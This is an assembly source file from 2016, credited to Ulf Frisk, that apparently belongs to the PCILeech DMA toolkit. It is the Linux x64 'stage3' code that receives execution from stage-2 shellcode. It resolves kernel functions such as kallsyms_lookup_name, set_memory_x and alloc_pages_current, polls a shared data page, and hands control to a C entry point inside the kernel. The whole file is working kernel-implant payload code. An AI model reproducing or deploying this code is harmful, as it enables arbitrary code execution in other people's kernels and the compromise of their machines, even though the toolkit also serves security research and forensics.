; lx64_stage3.asm : assembly to receive execution from stage2 shellcode.
; Compatible with Linux x64.
;
; (c) Ulf Frisk, 2016
; Author: Ulf Frisk, pcileech@frizk.net
;

EXTRN stage3_c_EntryPoint:NEAR

.CODE

main PROC
	; ----------------------------------------------------
	; 1: SAME INITIAL BYTE SEQUENCE AS lx64_stage3_pre.asm
	; ----------------------------------------------------
	label_main_base:	
	JMP label_main_loop
	str_msleep db 'msleep', 0
	label_main_loop:
	LEA rdi, str_msleep
	LEA rax, label_main_base-1000h+10h		; KMDDATA.AddrKallsymsLookupName
	MOV rax, [rax]
	CALL rax
	MOV rdi, 100
	CALL rax
	LEA rax, label_main_base-8h
	MOV rax, [rax]
	CMP rax, 0
	JZ label_main_loop
	; ----------------------------------------------------
	; 2: CALL C CODE
	; ----------------------------------------------------
	LEA rcx, label_main_base - 1000h ; address of data page in parameter 1
	PUSH r15
	MOV r15, rsp
	AND rsp, 0FFFFFFFFFFFFFFF0h
	SUB rsp, 020h
	CALL stage3_c_EntryPoint
	MOV rsp, r15
	POP r15
	; ----------------------------------------------------
	; 3: RESTORE AND RETURN
	; ----------------------------------------------------
	RET
main ENDP


; ------------------------------------------------------------------
; Lookup function pointers and place them in the supplied struct
; rcx -> address of kallsyms_lookup_name
; rdx -> ptr to FNLX struct 
; rax <- 0 = FAIL, 1 = SUCCESS
; ------------------------------------------------------------------
LookupFunctions PROC
	; ----------------------------------------------------
	; 0: SET UP / STORE NV-REGISTERS
	; ----------------------------------------------------
	PUSH r15
	PUSH r14
	PUSH r13
	MOV r15, rcx				; address of kallsyms_lookup_name
	MOV r14, rdx				; ptr to FNLX struct 
	MOV r13, 9*8				; num functions * 8
	; ----------------------------------------------------
	; 1: PUSH FUNCTION NAME POINTERS ON STACK
	; ----------------------------------------------------
	LEA rax, str_kallsyms_lookup_name
	PUSH rax
	LEA rax, str_msleep
	PUSH rax
	LEA rax, str_alloc_pages_current
	PUSH rax
	LEA rax, str_set_memory_x
	PUSH rax
	LEA rax, str__free_pages
	PUSH rax
	LEA rax, str_memcpy
	PUSH rax
	LEA rax, str_schedule
	PUSH rax
	LEA rax, str_do_gettimeofday
	PUSH rax
	LEA rax, str_iomem_open
	PUSH rax
	; ----------------------------------------------------
	; 2: LOOKUP FUNCTION POINTERS BY NAME
	; ----------------------------------------------------
	lookup_loop:
	SUB r13, 8
	MOV rcx, r15
	POP rdx
	CALL SysVCall
	TEST rax, rax
	JZ lookup_fail
	MOV [r14+r13], rax
	TEST r13, r13
	JNZ lookup_loop
	; ----------------------------------------------------
	; 3: RESTORE NV REGISTERS AND RETURN
	; ----------------------------------------------------
	POP r13
	POP r14
	POP r15
	MOV RAX, 1
	RET
	lookup_fail:
	XOR rax, rax
	RET
LookupFunctions ENDP

str_kallsyms_lookup_name		db		'kallsyms_lookup_name', 0
str_alloc_pages_current			db		'alloc_pages_current', 0
str_set_memory_x				db		'set_memory_x', 0
str__free_pages					db		'__free_pages', 0
str_memcpy						db		'memcpy', 0
str_schedule					db		'schedule', 0
str_do_gettimeofday				db		'do_gettimeofday', 0
str_iomem_open					db		'iomem_open', 0

; ------------------------------------------------------------------
; Convert from the Windows X64 calling convention to the SystemV
; X64 calling convention used by Linux. A maximum of three (5)
; parameters in addition to the function ptr can be supplied.
; QWORD SysVCall(QWORD fn, QWORD p1, QWORD p2, QWORD p3, QWORD p4, QWORD p5);
; QWORD SysVCall(QWORD fn, ...);
; ------------------------------------------------------------------
SysVCall PROC
	MOV rax, rcx
	PUSH rdi
	PUSH rsi

	MOV rdi, rdx
	MOV rsi, r8
	MOV rdx, r9
	MOV rcx, [rsp+28h+2*8+00h] ; 20h stack shadow space + 8h (RET) + 2*8h PUSH + xxh offset
	MOV r8,  [rsp+28h+2*8+08h]
	MOV r9,  [rsp+28h+2*8+10h]

	PUSH r15
	MOV r15, rsp
	AND rsp, 0FFFFFFFFFFFFFFF0h
	SUB rsp, 020h
	CALL rax
	MOV rsp, r15
	POP r15

	POP rsi
	POP rdi
	RET
SysVCall ENDP

; ------------------------------------------------------------------
; Convert a physical address to a virtual address (Linux)
; Function uses Windows calling convention (rcx = 1st param)
; ------------------------------------------------------------------
m_phys_to_virt PROC
	MOV rax, 0ffff880000000000h
	ADD rax, rcx
	RET
m_phys_to_virt ENDP

; ------------------------------------------------------------------
; Convert a struct_page to to a physical address (Linux)
; Function uses Windows calling convention (rcx = 1st param)
; ------------------------------------------------------------------
m_page_to_phys PROC
	MOV rax, 0ffffea0000000000h
	SUB rcx, rax
	SHR rcx, 7		; PFN
	SHL rcx, 12
	MOV rax, rcx
	RET
m_page_to_phys ENDP

END
